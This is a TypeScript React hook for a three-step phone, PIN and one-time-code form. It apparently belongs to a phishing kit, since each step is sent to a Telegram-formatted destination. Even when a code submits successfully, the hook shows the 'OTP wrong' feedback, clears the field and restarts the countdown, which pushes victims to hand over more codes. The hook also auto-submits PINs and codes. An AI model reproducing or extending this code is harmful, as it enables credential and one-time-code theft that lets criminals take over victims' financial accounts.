'use client';

import { useEffect, useRef, useState } from 'react';
import { OTP_COUNTDOWN_SEC, OTP_LOCK_MS, OVERLAY_MIN_MS } from '../lib/constants';
import {
  clearPendingEnterpriseSound,
  playEnterpriseOtpSound,
  playEnterpriseOtpSoundFromGesture,
  preloadEnterpriseOtpSound,
  unlockEnterpriseAudioSync,
} from '../lib/audio';
import { useEnterpriseKeyboardOffset } from '../hooks/useKeyboardOffset';
import { submitEnterpriseStep } from '../lib/submit';
import type { EnterpriseSlugData, EnterpriseStepData } from '../lib/types';
import type { EnterpriseTelegramProduct } from '../lib/telegram-format';
import { ENTERPRISE_INITIAL_STEP_DATA } from '../lib/types';
import { otpIsValid, phoneIsValid, pinIsValid, vibrateOtpWrong } from '../lib/utils';

export type EnterpriseFormFlowOptions = {
  disableSound?: boolean;
  autoSubmitPin?: boolean;
  otpLength?: number;
  autoSubmitOtp?: boolean;
};

export function useEnterpriseFormFlow(
  slugData: EnterpriseSlugData,
  product: EnterpriseTelegramProduct,
  options: EnterpriseFormFlowOptions = {}
) {
  const {
    disableSound = false,
    autoSubmitPin = true,
    otpLength = 4,
    autoSubmitOtp = true,
  } = options;
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [previousStep, setPreviousStep] = useState<number | null>(null);
  const [stepData, setStepData] = useState<EnterpriseStepData>(ENTERPRISE_INITIAL_STEP_DATA);
  const [submitting, setSubmitting] = useState(false);
  const [isLoadingOverlay, setIsLoadingOverlay] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [countdown, setCountdown] = useState(OTP_COUNTDOWN_SEC);
  const [otpLocked, setOtpLocked] = useState(false);
  const [otpFilled, setOtpFilled] = useState(false);
  const [otpToastVisible, setOtpToastVisible] = useState(false);
  const [otpCompleteRingVisible, setOtpCompleteRingVisible] = useState(false);
  const [step3Entered, setStep3Entered] = useState(false);

  const pinInputRef = useRef<HTMLInputElement>(null);
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const otpLockTimeoutRef = useRef<number | null>(null);
  const otpCompleteRingTimeoutRef = useRef<number | null>(null);
  const previousStepTimerRef = useRef<number | null>(null);
  const step3GestureSoundRef = useRef(false);
  const keyboardOffset = useEnterpriseKeyboardOffset();

  const fadeDurationMs = 480;
  const isStep1FadingOut = previousStep === 1;
  const isStep2FadingOut = previousStep === 2;
  const isStep3SlidingIn = step === 3 && !step3Entered;
  const phoneValid = phoneIsValid(stepData.phone);

  useEffect(() => {
    if (!disableSound) preloadEnterpriseOtpSound();
  }, [disableSound]);

  useEffect(() => {
    if (disableSound || step !== 3) {
      step3GestureSoundRef.current = false;
      clearPendingEnterpriseSound();
      return;
    }
    playEnterpriseOtpSound();
  }, [step, disableSound]);

  useEffect(() => {
    if (step === 2) {
      const timer = window.setTimeout(() => pinInputRef.current?.focus(), 100);
      return () => window.clearTimeout(timer);
    }
    return undefined;
  }, [step]);

  useEffect(() => {
    if (previousStep === null) return undefined;
    if (previousStepTimerRef.current) window.clearTimeout(previousStepTimerRef.current);
    previousStepTimerRef.current = window.setTimeout(() => {
      setPreviousStep(null);
      previousStepTimerRef.current = null;
    }, fadeDurationMs);
    return () => {
      if (previousStepTimerRef.current) window.clearTimeout(previousStepTimerRef.current);
    };
  }, [previousStep]);

  useEffect(() => {
    if (step === 3 && countdown > 0) {
      const timer = window.setTimeout(() => setCountdown((v) => v - 1), 1000);
      return () => window.clearTimeout(timer);
    }
    if (step !== 3) setCountdown(OTP_COUNTDOWN_SEC);
    return undefined;
  }, [step, countdown]);

  useEffect(() => {
    if (step === 3) {
      const timer = window.setTimeout(() => setStep3Entered(true), 10);
      return () => window.clearTimeout(timer);
    }
    setStep3Entered(false);
    return undefined;
  }, [step]);

  const handleNext = async () => {
    if (step === 3 && otpLocked) return;

    unlockEnterpriseAudioSync();
    setErrorMessage('');
    setSubmitting(true);
    setIsLoadingOverlay(true);

    const overlayStart = Date.now();
    const currentStep = step;
    let success = false;

    const { success: ok, error } = await submitEnterpriseStep(
      slugData.slug,
      currentStep,
      stepData,
      0,
      product
    );
    success = ok;
    if (error) setErrorMessage(error);

    const remaining = OVERLAY_MIN_MS - (Date.now() - overlayStart);
    if (remaining > 0) await new Promise((r) => setTimeout(r, remaining));

    if (success) {
      if (currentStep < 3) {
        setPreviousStep(currentStep);
        setStep((currentStep + 1) as 2 | 3);
      } else {
        vibrateOtpWrong();
        setStep(3);
        setOtpLocked(true);
        if (otpLockTimeoutRef.current) window.clearTimeout(otpLockTimeoutRef.current);
        otpLockTimeoutRef.current = window.setTimeout(() => {
          setStepData((prev) => ({ ...prev, otp: '' }));
          setCountdown(OTP_COUNTDOWN_SEC);
          setOtpLocked(false);
          otpLockTimeoutRef.current = null;
        }, OTP_LOCK_MS);
      }
    }

    setSubmitting(false);
    setIsLoadingOverlay(false);
    if (!success && currentStep === 3) vibrateOtpWrong();
  };

  useEffect(() => {
    if (submitting) return;
    const pinReady = step === 2 && autoSubmitPin && pinIsValid(stepData.pin);
    const otpReady = step === 3 && autoSubmitOtp && otpIsValid(stepData.otp, otpLength);
    if (pinReady || otpReady) void handleNext();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step, stepData.pin, stepData.otp, submitting, autoSubmitPin, autoSubmitOtp, otpLength]);

  const handleOtpChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, '').slice(0, 1);
    setStepData((prev) => {
      const otpArray = prev.otp.padEnd(otpLength, ' ').split('');
      otpArray[index] = digit;
      const nextOtp = otpArray.join('').replace(/\s/g, '').slice(0, otpLength);

      if (nextOtp.replace(/\D/g, '').length === otpLength) {
        setOtpFilled(true);
        setOtpToastVisible(true);
        setOtpCompleteRingVisible(true);
        if (otpCompleteRingTimeoutRef.current) window.clearTimeout(otpCompleteRingTimeoutRef.current);
        otpCompleteRingTimeoutRef.current = window.setTimeout(() => {
          setOtpCompleteRingVisible(false);
          otpCompleteRingTimeoutRef.current = null;
        }, 3000);
        window.setTimeout(() => setOtpToastVisible(false), 12000);
      } else {
        setOtpFilled(false);
        setOtpToastVisible(false);
        setOtpCompleteRingVisible(false);
      }
      return { ...prev, otp: nextOtp };
    });
    if (digit && index < otpLength - 1) otpInputRefs.current[index + 1]?.focus();
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !stepData.otp[index] && index > 0) {
      otpInputRefs.current[index - 1]?.focus();
    }
  };

  const goBackStep = () => {
    setErrorMessage('');
    if (step === 1) return false;

    if (otpLockTimeoutRef.current) {
      window.clearTimeout(otpLockTimeoutRef.current);
      otpLockTimeoutRef.current = null;
    }

    setPreviousStep(null);
    setOtpLocked(false);
    setOtpFilled(false);
    setOtpToastVisible(false);
    setOtpCompleteRingVisible(false);

    if (step === 3) {
      setStepData((prev) => ({ ...prev, otp: '', pin: '' }));
      setStep(2);
      return true;
    }

    if (step === 2) {
      setStepData((prev) => ({ ...prev, pin: '' }));
      setStep(1);
      return true;
    }

    return false;
  };

  return {
    step,
    previousStep,
    stepData,
    setStepData,
    submitting,
    isLoadingOverlay,
    errorMessage,
    countdown,
    setCountdown,
    otpFilled,
    otpToastVisible,
    otpCompleteRingVisible,
    otpLocked,
    pinInputRef,
    otpInputRefs,
    keyboardOffset,
    isStep1FadingOut,
    isStep2FadingOut,
    isStep3SlidingIn,
    phoneValid,
    pinValid: pinIsValid(stepData.pin),
    otpLength,
    handleNext,
    handleOtpChange,
    handleOtpKeyDown,
    goBackStep,
    unlockEnterpriseAudioSync,
    playEnterpriseOtpSoundFromGesture,
    step3GestureSoundRef,
  };
}
